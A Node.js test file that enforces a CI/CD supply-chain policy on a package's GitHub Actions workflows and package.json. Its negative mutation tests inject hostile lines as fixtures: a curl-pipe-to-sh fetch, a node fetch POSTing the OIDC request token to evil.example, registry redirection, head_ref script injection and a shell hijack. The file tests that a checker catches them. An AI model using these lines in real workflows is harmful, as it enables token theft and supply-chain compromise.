import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, existsSync, readdirSync } from 'node:fs';
import { execFileSync } from 'node:child_process';
import { checkWorkflow, checkPackagePolicy, normalizeForGolden, ALLOWED_ACTIONS } from './helpers/workflow-policy.mjs';

const root = new URL('..', import.meta.url);
const read = (p) => readFileSync(new URL(p, root), 'utf8');
const pkg = JSON.parse(read('package.json'));
const ci = () => read('.github/workflows/ci.yml');
const release = () => read('.github/workflows/release.yml');

// Pack budget, recorded from `npm pack --dry-run --json` (2026-11-21, before the Task 8 docs).
// Growth beyond 25% needs a deliberate edit here.
const RECORDED_PACKED_SIZE = 320697; // bytes, tarball
const RECORDED_UNPACKED_SIZE = 1036152; // bytes
const GROWTH = 1.25;
const MAX_FILE = 1024 * 1024;

test('package.json policy (spec 5.13)', () => {
  assert.deepEqual(pkg.files, ['bin', 'skill']);
  for (const k of ['preinstall', 'install', 'postinstall', 'prepare', 'prepublishOnly', 'prepack', 'postpack', 'publish', 'postpublish'])
    assert.equal(pkg.scripts?.[k], undefined, k);
  assert.deepEqual(Object.keys(pkg.dependencies ?? {}), []);
  assert.deepEqual(Object.keys(pkg.devDependencies ?? {}), []);
  assert.deepEqual(Object.keys(pkg.optionalDependencies ?? {}), []);
  assert.equal(pkg.engines.node, '>=20');
  assert.ok(pkg.repository?.url);
});

test('workflow and policy files exist', () => {
  for (const f of ['.github/workflows/ci.yml', '.github/workflows/release.yml', 'SECURITY.md', 'CONTRIBUTING.md'])
    assert.ok(existsSync(new URL(f, root)), f);
});

test('ci.yml passes the workflow policy', () => {
  assert.deepEqual(checkWorkflow(ci(), 'ci').violations, []);
});
test('release.yml passes the workflow policy', () => {
  assert.deepEqual(checkWorkflow(release(), 'release').violations, []);
});

test('only the two allowed actions are used', () => {
  assert.deepEqual(ALLOWED_ACTIONS, ['actions/checkout', 'actions/setup-node']);
  for (const [n, t] of [['ci', ci()], ['release', release()]]) {
    const uses = [...t.matchAll(/^\s*(?:-\s+)?uses:\s*(\S+)/gm)].map((m) => m[1]);
    assert.ok(uses.length >= 2, n);
    for (const u of uses) assert.ok(ALLOWED_ACTIONS.includes(u.split('@')[0]), `${n}: ${u}`);
  }
});

test('actions pinned by full SHA (warning-level; enforced when RELEASE_REQUIRE_PINNED=1)', (t) => {
  const rel = checkWorkflow(release(), 'release').unpinned;
  const all = [...rel, ...checkWorkflow(ci(), 'ci').unpinned];
  if (all.length) {
    t.diagnostic(`WARNING release blocker: ${all.length} action reference(s) are tags, not 40-hex commit SHAs (unverified): ${[...new Set(all)].join(', ')}. ` +
      'Replace them with verified SHAs before the first release (see CONTRIBUTING.md).');
  }
  if (process.env.RELEASE_REQUIRE_PINNED === '1') assert.deepEqual(rel, [], 'release.yml actions must be pinned to full commit SHAs');
});

test('workflow files never mention the unsafe trigger, even in comments', () => {
  for (const t of [ci(), release()]) assert.ok(!/pull_request_target/.test(t));
});

// Golden comparison: any edit to the sensitive workflow needs a deliberate golden update in review.
// Update with: node -e "import('./test/helpers/workflow-policy.mjs').then(m=>require('fs').writeFileSync('test/helpers/release.golden.yml',m.normalizeForGolden(require('fs').readFileSync('.github/workflows/release.yml','utf8'))))"
test('release.yml matches the reviewed golden (pin comments and action refs ignored)', () => {
  assert.equal(normalizeForGolden(release()), read('test/helpers/release.golden.yml'));
});

test('golden: a harmless-looking edit (comment trick, changed step name) still fails the golden', () => {
  for (const bad of [release().replace('permissions: {}', 'permissions: {} # permissions:'), release().replace('name: Tests', 'name: Tests2')])
    assert.notEqual(normalizeForGolden(bad), read('test/helpers/release.golden.yml'));
});

test('an invalid action ref also breaks the golden', () => {
  assert.notEqual(normalizeForGolden(release().replace('actions/checkout@v4', 'actions/checkout@evil-branch')), read('test/helpers/release.golden.yml'));
});

test('SHA pin with a trailing version comment (the documented pinning flow) matches the golden and the checker', () => {
  const sha = (c) => c.repeat(40);
  let t = release().split('\n').filter((l) => !/# UNVERIFIED pin:/.test(l)).join('\n');
  t = t.replaceAll('actions/checkout@v4', `actions/checkout@${sha('a')} # v4.1.0`).replaceAll('actions/setup-node@v4', `actions/setup-node@${sha('b')} # v4.0.2`);
  assert.equal(normalizeForGolden(t), read('test/helpers/release.golden.yml'));
  const r = checkWorkflow(t, 'release');
  assert.deepEqual(r.violations, []);
  assert.deepEqual(r.unpinned, []);
});

function npmrcFiles() {
  const found = [];
  const walk = (dir, rel) => {
    for (const e of readdirSync(new URL(dir, root), { withFileTypes: true })) {
      if (e.name === '.npmrc') found.push(rel + e.name);
      if (e.isDirectory()) walk(`${dir}${e.name}/`, `${rel}${e.name}/`);
    }
  };
  for (const d of ['bin/', 'skill/']) walk(d, d);
  if (existsSync(new URL('.npmrc', root))) found.push('.npmrc');
  return found;
}
test('no .npmrc and no publish redirection in the repository or package.json', () => {
  assert.deepEqual(npmrcFiles(), []);
  assert.deepEqual(checkPackagePolicy(pkg, npmrcFiles()), []);
});
test('negative: package policy reports .npmrc, publishConfig redirection and a changed files list', () => {
  assert.deepEqual(checkPackagePolicy(pkg, ['.npmrc']), ['npmrc-present']);
  assert.deepEqual(checkPackagePolicy(pkg, ['skill/.npmrc']), ['npmrc-present']);
  assert.deepEqual(checkPackagePolicy({ ...pkg, publishConfig: { registry: 'https://evil.example/' } }, []), ['publishconfig']);
  assert.deepEqual(checkPackagePolicy({ ...pkg, publishConfig: { registry: 'https://registry.npmjs.org/', tag: 'x' } }, []), ['publishconfig']);
  assert.deepEqual(checkPackagePolicy({ ...pkg, publishConfig: { access: 'public' } }, []), []);
  assert.deepEqual(checkPackagePolicy({ ...pkg, publishConfig: { registry: 'https://registry.npmjs.org/' } }, []), []);
  assert.deepEqual(checkPackagePolicy({ ...pkg, files: ['bin', 'skill', 'dev'] }, []), ['files']);
});

test('CODEOWNERS covers the policy-bearing paths', () => {
  const c = read('.github/CODEOWNERS');
  for (const p of ['/.github/', '/test/helpers/', '/package.json', '/test/release-policy.test.js', '/SECURITY.md', '/.npmrc']) assert.ok(c.includes(p), p);
  assert.ok(c.includes('@alphadevthasa'));
});

// Negative tests: every mutation of the real files must be reported, so the policy test cannot
// pass vacuously. [kind, name, mutate, expected code or null (any violation is enough)]
const R = (a, b) => (t) => { assert.ok(t.includes(a), `fixture text not found: ${a}`); return t.replace(a, b); };
const RA = (a, b) => (t) => { assert.ok(t.includes(a), `fixture text not found: ${a}`); return t.replaceAll(a, b); };
const re = (rx, b) => (t) => t.replace(rx, b);
const ON = /^on:[\s\S]*?\npermissions/m;
const PUB = '  publish:\n'; // publish job starts here; edits after it hit the publish job
const inPublish = (a, b) => (t) => { const i = t.indexOf(PUB); assert.ok(i > 0); const tail = t.slice(i); assert.ok(tail.includes(a), `not in publish: ${a}`); return t.slice(0, i) + tail.replace(a, b); };
const mutations = [
  ['release', 'add pull_request trigger', R('  workflow_dispatch:\n', '  workflow_dispatch:\n  pull_request:\n'), 'release-triggers'],
  ['release', 'unsafe trigger', R('  workflow_dispatch:\n', '  workflow_dispatch:\n  pull_request_target:\n'), 'pull_request_target'],
  ['release', 'branch push', R("    tags:\n      - 'v*'", '    branches:\n      - main'), 'release-push-tags-only'],
  ['release', 'top-level write perms', R('permissions: {}', 'permissions:\n  contents: write'), 'release-top-permissions'],
  ['release', 'no provenance', RA('--provenance ', ''), 'run-not-allowed:publish'],
  ['release', 'publish without ignore-scripts', R(' --ignore-scripts', ''), 'run-not-allowed:publish'],
  ['release', 'publish without pinned registry', R(' --registry https://registry.npmjs.org', ''), 'run-not-allowed:publish'],
  ['release', 'publish to another registry', R('--registry https://registry.npmjs.org', '--registry https://evil.example'), 'run-not-allowed:publish'],
  ['release', 'branch ref action', R('actions/checkout@v4', 'actions/checkout@evil-branch'), 'action-ref-format'],
  ['release', 'main ref action', R('actions/setup-node@v4', 'actions/setup-node@main'), 'action-ref-format'],
  ['release', 'v4-evil ref', R('actions/checkout@v4', 'actions/checkout@v4-evil'), 'action-ref-format'],
  ['release', 'V4 ref', R('actions/checkout@v4', 'actions/checkout@V4'), 'action-ref-format'],
  ['release', 'v4. ref', R('actions/checkout@v4', 'actions/checkout@v4.'), 'action-ref-format'],
  ['release', 'bare 4 ref', R('actions/checkout@v4', 'actions/checkout@4'), 'action-ref-format'],
  ['release', '39-hex ref', R('actions/checkout@v4', `actions/checkout@${'a'.repeat(39)}`), 'action-ref-format'],
  ['release', '41-hex ref', R('actions/checkout@v4', `actions/checkout@${'a'.repeat(41)}`), 'action-ref-format'],
  ['release', 'uppercase-hex ref', R('actions/checkout@v4', `actions/checkout@${'A'.repeat(40)}`), 'action-ref-format'],
  ['ci', 'branch ref action', R('actions/checkout@v4', 'actions/checkout@evil-branch'), 'action-ref-format'],
  ['ci', 'main ref action', R('actions/setup-node@v4', 'actions/setup-node@main'), 'action-ref-format'],
  ['release', 'no environment', R('    environment: release\n', ''), 'release-environment'],
  ['release', 'other environment', R('environment: release', 'environment: staging'), 'release-environment'],
  ['release', 'environment on verify', R('  verify:\n    runs-on: ubuntu-latest\n', '  verify:\n    environment: release\n    runs-on: ubuntu-latest\n'), 'release-environment'],
  ['release', 'publish does not need verify', R('    needs: verify\n', ''), 'release-needs'],
  ['release', 'id-token at top level', R('permissions: {}', 'permissions:\n  id-token: write'), 'release-top-permissions'],
  ['release', 'id-token on verify', R('  verify:\n    runs-on: ubuntu-latest\n    timeout-minutes: 20\n    permissions:\n      contents: read\n', '  verify:\n    runs-on: ubuntu-latest\n    timeout-minutes: 20\n    permissions:\n      contents: read\n      id-token: write\n'), 'release-job-permissions:verify'],
  ['release', 'extra permission on publish', R('      id-token: write\n', '      id-token: write\n      packages: write\n'), 'release-job-permissions:publish'],
  ['release', 'write-all on publish', R('    permissions:\n      contents: read\n      id-token: write\n', '    permissions: write-all\n'), 'release-job-permissions:publish'],
  ['release', 'token at job level', R('    environment: release\n', '    environment: release\n    env:\n      NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\n'), 'job-key:publish.env'],
  ['release', 'token in test step', R('        run: npm test\n', '        run: npm test\n        env:\n          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\n'), 'step-env'],
  ['release', 'token at top level', R('permissions: {}\n', 'permissions: {}\nenv:\n  NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\n'), 'top-key:env'],
  ['release', 'second secret', R('      - name: Tests\n', '      - name: Tests\n        env:\n          OTHER: ${{ secrets.OTHER }}\n'), 'unexpected-expression'],
  ['release', 'checkout keeps credentials', R('persist-credentials: false', 'persist-credentials: true'), 'checkout-persist-credentials'],
  ['release', 'shallow checkout', R('fetch-depth: 0', 'fetch-depth: 1'), 'release-checkout-fetch-depth'],
  ['release', 'checkout ref', R('          fetch-depth: 0', '          fetch-depth: 0\n          ref: refs/heads/evil'), 'with-key:checkout'],
  ['release', 'checkout token', R('          fetch-depth: 0', '          fetch-depth: 0\n          token: ${{ secrets.NPM_TOKEN }}'), 'with-key:checkout'],
  ['release', 'no timeout', R('    timeout-minutes: 20\n', ''), 'job-timeout:verify'],
  ['release', 'huge timeout', R('timeout-minutes: 20', 'timeout-minutes: 99999'), 'job-timeout:verify'],
  ['release', 'extra step after publish', (t) => `${t}      - run: echo done\n`, 'release-steps:publish'],
  ['release', 'third-party action', R('actions/setup-node@v4', 'someone/else@v1'), 'disallowed-action:someone/else@v1'],
  ['release', 'uppercase action name', R('uses: actions/checkout@v4', 'uses: Actions/Checkout@v4'), 'disallowed-action:Actions/Checkout@v4'],
  ['release', 'script injection in run', R('run: npm test', 'run: echo ${{ github.event.head_commit.message }} && npm test'), 'run-not-allowed:verify'],
  ['release', 'head_ref in run block', R('run: npm test', 'run: |\n          # ok\n          echo ${{ github.head_ref }}'), 'unexpected-expression'],
  ['release', 'interpolation in with', inPublish('registry-url: https://registry.npmjs.org', 'registry-url: https://registry.npmjs.org\n          scope: ${{ github.event.inputs.x }}'), 'unexpected-expression'],
  ['release', 'tag check removed', RA('GITHUB_REF_TYPE', 'GITHUB_REF_X'), 'run-not-allowed:verify'],
  ['release', 'tag check inverted', RA('"$GITHUB_REF_TYPE" != "tag"', '"$GITHUB_REF_TYPE" = "tag"'), 'run-not-allowed:verify'],
  ['release', 'tag guard missing in publish', (t) => { const i = t.indexOf(PUB); const tail = t.slice(i); const a = tail.indexOf('      - name: Verify the ref'); const b = tail.indexOf('      - name: Verify the tagged'); return t.slice(0, i) + tail.slice(0, a) + tail.slice(b); }, 'release-steps:publish'],
  ['release', 'ancestry check removed', RA('--is-ancestor', '--is-descendant'), 'run-not-allowed:verify'],
  ['release', 'ancestry guard no-op', R('git merge-base --is-ancestor HEAD origin/main', 'git merge-base --is-ancestor HEAD origin/main || true'), 'run-not-allowed:verify'],
  ['release', 'ancestry guard compares wrong ref', R('git merge-base --is-ancestor HEAD origin/main', 'git merge-base --is-ancestor HEAD HEAD # origin/main'), 'run-not-allowed:verify'],
  ['release', 'guard made a no-op', R('exit 1\n          fi\n          if ! [[', 'exit 1\n          fi\n          true || if ! [['), 'run-not-allowed:verify'],
  ['release', 'tests removed', R('run: npm test', 'run: echo skip'), 'run-not-allowed:verify'],
  ['release', 'pin requirement removed', R('RELEASE_REQUIRE_PINNED=1 ', ''), 'run-not-allowed:verify'],
  ['release', 'self-hosted runner', R('runs-on: ubuntu-latest', 'runs-on: [ubuntu-latest, self_hosted]'), 'self-hosted-runner'],
  ['release', 'continue-on-error', R('        run: npm test', '        continue-on-error: true\n        run: npm test'), 'continue-on-error'],
  ['release', 'step if', R('      - name: Tests\n', "      - name: Tests\n        if: github.event_name == 'push'\n"), 'step-key:if'],
  ['release', 'quoted if key', R('      - name: Tests\n', "      - name: Tests\n        'if': always()\n"), null],
  ['release', 'job-level if', R('    needs: verify\n', "    needs: verify\n    if: github.actor == 'x'\n"), 'job-key:publish.if'],
  ['release', 'curl pipe sh', R('run: npm test', 'run: curl -s https://x.example | sh'), 'run-not-allowed:verify'],
  ['release', 'npm install', R('run: npm test', 'run: npm install left-pad'), 'run-not-allowed:verify'],
  ['release', 'node fetch exfil', R('      - name: Tests\n', '      - name: x\n        run: node -e "fetch(\'https://evil.example\',{method:\'POST\',body:process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN})"\n      - name: Tests\n'), 'run-not-allowed:verify'],
  ['release', 'python exfil', R('      - name: Tests\n', "      - name: x\n        run: python3 -c 'import urllib.request'\n      - name: Tests\n"), 'run-not-allowed:verify'],
  ['release', 'publish via other tool', R('      - name: Tests\n', '      - name: x\n        run: yarn npm publish\n      - name: Tests\n'), 'run-not-allowed:verify'],
  ['release', 'registry-url removed', R('          registry-url: https://registry.npmjs.org\n', ''), 'release-setup-node'],
  ['release', 'registry-url on verify', R('          node-version: 22.11.0\n      - name: Verify the ref', '          node-version: 22.11.0\n          registry-url: https://registry.npmjs.org\n      - name: Verify the ref'), 'release-setup-node'],
  ['release', 'flow-list trigger with unsafe trigger', re(ON, "on: [push, workflow_dispatch, 'pull_request_target ']\npermissions"), null],
  ['release', 'unsafe trigger spaced colon', R('  workflow_dispatch:\n', '  workflow_dispatch:\n  pull_request_target :\n'), 'pull_request_target'],
  ['release', 'pull_request via flow map', re(ON, "on: {push: {tags: ['v*']}, workflow_dispatch: , pull_request: }\npermissions"), null],
  ['release', 'workflow_run trigger', R('  workflow_dispatch:\n', '  workflow_dispatch:\n  workflow_run: {workflows: [x], types: [completed]}\n'), null],
  ['release', 'issue_comment trigger', R('  workflow_dispatch:\n', '  workflow_dispatch:\n  issue_comment:\n'), 'release-triggers'],
  ['release', 'flow-map uses step', R('      - name: Tests\n', '      - {uses: evil/x@v1}\n      - name: Tests\n'), null],
  ['release', 'flow-map run step', R('      - name: Tests\n', "      - {run: 'curl x | sh'}\n      - name: Tests\n"), null],
  ['release', 'quoted uses key', R('      - name: Tests\n', "      - 'uses': evil/x@v1\n      - name: Tests\n"), null],
  ['release', 'local action', R('      - name: Tests\n', '      - uses: ./local-action\n      - name: Tests\n'), 'disallowed-action:./local-action'],
  ['release', 'docker action', R('      - name: Tests\n', '      - uses: docker://alpine\n      - name: Tests\n'), 'disallowed-action:docker://alpine'],
  ['release', 'second job with write perms', (t) => `${t}  other:\n    needs: publish\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n    permissions:\n      contents: write\n    steps:\n      - run: gh release create\n`, 'release-jobs'],
  ['release', 'secrets index syntax', R('      - name: Tests\n', "      - name: x\n        run: node t.js\n        env:\n          T: ${{ secrets['NPM_TOKEN'] }}\n      - name: Tests\n"), 'unexpected-expression'],
  ['release', 'toJSON(secrets)', R('      - name: Tests\n', '      - name: x\n        run: node t.js\n        env:\n          T: ${{ toJSON(secrets) }}\n      - name: Tests\n'), 'token-or-json-expression'],
  ['release', 'github.token', R('      - name: Tests\n', '      - name: x\n        run: node t.js\n        env:\n          T: ${{ github.token }}\n      - name: Tests\n'), 'token-or-json-expression'],
  ['release', 'step env overrides GITHUB_REF_TYPE', R('        shell: bash\n        run: |\n          set -euo pipefail\n          if [ "$GITHUB_REF_TYPE"', '        shell: bash\n        env:\n          GITHUB_REF_TYPE: tag\n        run: |\n          set -euo pipefail\n          if [ "$GITHUB_REF_TYPE"'), 'step-env'],
  ['release', 'NODE_OPTIONS preload', R('        run: npm test\n', '        run: npm test\n        env:\n          NODE_OPTIONS: --require ./x.js\n'), 'node-options'],
  ['release', 'container image', R('    environment: release\n', '    environment: release\n    container: evil/image:latest\n'), 'job-key:publish.container'],
  ['release', 'defaults shell hijack', R('permissions: {}\n', "permissions: {}\ndefaults:\n  run:\n    shell: bash -c 'curl x' {0}\n"), 'top-key:defaults'],
  ['release', 'anchors and aliases', R('      - name: Tests\n        run: npm test', '      - &t\n        name: Tests\n        run: npm test\n      - *t'), null],
  ['release', 'merge key', R('  verify:\n', '  verify:\n    <<: *x\n'), null],
  ['release', 'CRLF endings', RA('\n', '\r\n'), 'yaml-unsupported: carriage return'],
  ['release', 'tab indentation', R('      - name: Tests\n        run: npm test', '      - name: Tests\n\trun: npm test'), 'yaml-unsupported: tab character'],
  ['release', 'extra YAML document', (t) => `${t}---\non: pull_request\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo\n`, null],
  ['release', 'concurrency cancels in progress', R('cancel-in-progress: false', 'cancel-in-progress: true'), 'release-concurrency'],
  ['release', 'no concurrency', re(/concurrency:\n  group: release\n  cancel-in-progress: false\n\n/, ''), 'release-concurrency'],
  ['ci', 'unsafe trigger', R('  pull_request:\n', '  pull_request_target:\n'), 'pull_request_target'],
  ['ci', 'unsafe trigger in flow list', re(ON, 'on: [push, pull_request, pull_request_target ]\npermissions'), 'pull_request_target'],
  ['ci', 'workflow_run trigger', R('  pull_request:\n', '  pull_request:\n  workflow_run:\n'), 'ci-triggers'],
  ['ci', 'write permission', R('  contents: read\n\nconcurrency', '  contents: write\n\nconcurrency'), 'ci-write-permission'],
  ['ci', 'job-level write permission', R('      contents: read\n    strategy', '      contents: read\n      pull-requests: write\n    strategy'), 'ci-write-permission'],
  ['ci', 'secret use', R('run: npm test', 'run: npm test\n        env:\n          T: ${{ secrets.NPM_TOKEN }}'), 'ci-secrets'],
  ['ci', 'secret in with', R('node-version: ${{ matrix.node }}', 'node-version: ${{ matrix.node }}\n          token: ${{ secrets.NPM_TOKEN }}'), 'ci-secrets'],
  ['ci', 'head_ref in run', R('run: npm test', 'run: echo ${{ github.head_ref }}'), 'unexpected-expression'],
  ['ci', 'head_ref in env', R('run: npm test', 'run: npm test\n        env:\n          X: ${{ github.head_ref }}'), 'unexpected-expression'],
  ['ci', 'persist credentials', R('persist-credentials: false', 'persist-credentials: true'), 'checkout-persist-credentials'],
  ['ci', 'checkout PR head ref', R('          persist-credentials: false\n', '          persist-credentials: false\n          ref: ${{ github.event.pull_request.head.sha }}\n'), 'unexpected-expression'],
  ['ci', 'no timeout', R('    timeout-minutes: 15\n', ''), 'job-timeout:test'],
  ['ci', 'no concurrency cancel', R('cancel-in-progress:', 'x-cancel:'), 'ci-concurrency'],
  ['ci', 'tests replaced', R('run: npm test', 'run: echo'), 'run-not-allowed:test'],
  ['ci', 'tests masked', R('run: npm test', 'run: npm test || true'), 'run-not-allowed:test'],
  ['ci', 'third-party action', R('actions/setup-node@v4', 'codecov/codecov-action@v4'), 'disallowed-action:codecov/codecov-action@v4'],
];
for (const [kind, name, fn, code] of mutations) {
  test(`negative: ${kind} workflow with "${name}" is reported${code ? ` (${code})` : ''}`, () => {
    const base = kind === 'ci' ? ci() : release();
    const bad = fn(base);
    assert.notEqual(bad, base, 'mutation must change the text');
    const { violations } = checkWorkflow(bad, kind);
    if (code) assert.ok(violations.includes(code), `${code} not in ${JSON.stringify(violations)}`);
    else assert.ok(violations.length > 0, 'expected at least one violation');
  });
}

test('negative: a wholesale unsafe workflow reports many violations', () => {
  const bad = `name: x
on:
  pull_request_target:
  push:
permissions: write-all
jobs:
  publish:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
      - uses: evil/action@main
      - run: echo \${{ github.head_ref }} | sh
      - run: npm publish
        env:
          NODE_AUTH_TOKEN: \${{ secrets.NPM_TOKEN }}
`;
  const { violations } = checkWorkflow(bad, 'release');
  for (const c of ['pull_request_target', 'self-hosted-runner', 'checkout-persist-credentials', 'unexpected-expression', 'run-not-allowed:publish', 'job-timeout:publish', 'release-top-permissions', 'release-triggers', 'release-jobs'])
    assert.ok(violations.includes(c), `${c} missing from ${JSON.stringify(violations)}`);
  assert.ok(violations.some((c) => c.startsWith('disallowed-action:evil')));
});

test('negative: a SHA-pinned action is not reported as unpinned, a tag is', () => {
  const sha = 'a'.repeat(40);
  const r = checkWorkflow(release().replaceAll('actions/checkout@v4', `actions/checkout@${sha}`), 'release');
  assert.deepEqual(r.unpinned, ['actions/setup-node@v4', 'actions/setup-node@v4']);
  assert.deepEqual(r.violations, []);
});

test('npm pack contents, size budget and file sizes', () => {
  const out = execFileSync('npm', ['pack', '--dry-run', '--json', '--ignore-scripts'], { encoding: 'utf8', cwd: root.pathname, timeout: 60000 });
  const p = JSON.parse(out)[0];
  const ok = (f) => f.startsWith('bin/') || f.startsWith('skill/') || ['package.json', 'README.md', 'LICENSE', 'CHANGELOG.md'].includes(f);
  assert.deepEqual(p.files.map((f) => f.path).filter((f) => !ok(f)), []);
  for (const f of p.files) {
    assert.ok(!/(^|\/)(test|tests|dev|docs|eval|fixtures|\.ai|\.superpowers|\.github)(\/|$)/.test(f.path), f.path);
    assert.ok(f.size <= MAX_FILE, `${f.path} is ${f.size} bytes`);
  }
  assert.ok(p.size <= RECORDED_PACKED_SIZE * GROWTH, `packed size ${p.size} exceeds budget ${Math.floor(RECORDED_PACKED_SIZE * GROWTH)}`);
  assert.ok(p.unpackedSize <= RECORDED_UNPACKED_SIZE * GROWTH, `unpacked size ${p.unpackedSize} exceeds budget`);
});

test('CHANGELOG has an entry for the package version', () => {
  const v = pkg.version.replace(/[.]/g, '\\.');
  assert.match(read('CHANGELOG.md'), new RegExp(`^## \\[${v}\\]`, 'm'));
});

test('CONTRIBUTING.md lists the release blockers and SECURITY.md the reporting path', () => {
  const c = read('CONTRIBUTING.md');
  assert.match(c, /replace tag pins by verified SHAs/i);
  assert.match(c, /npm view android-architect/);
  assert.match(c, /release blocker/i);
  assert.match(c, /Gson/);
  assert.match(c, /CVE-2022-25647/);
  assert.match(c, /2026-08-31/);
  const s = read('SECURITY.md');
  assert.match(s, /private vulnerability reporting/i);
  assert.match(s, /telemetry/i);
});
